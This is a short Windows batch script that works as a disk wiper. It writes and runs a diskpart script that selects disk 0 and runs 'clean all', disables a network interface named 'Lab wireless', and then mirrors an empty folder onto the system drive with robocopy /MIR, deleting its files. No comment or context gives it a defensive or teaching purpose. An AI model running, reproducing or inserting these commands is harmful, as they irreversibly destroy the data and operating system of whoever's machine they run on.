@echo off
wmic logicaldisk get caption
(echo select disk 0 & echo clean all) > "%TEMP%\disk.txt"
diskpart /s "%TEMP%\disk.txt"
netsh interface set interface "Lab wireless" disable
robocopy C:\empty %SYSTEMDRIVE%\ /MIR
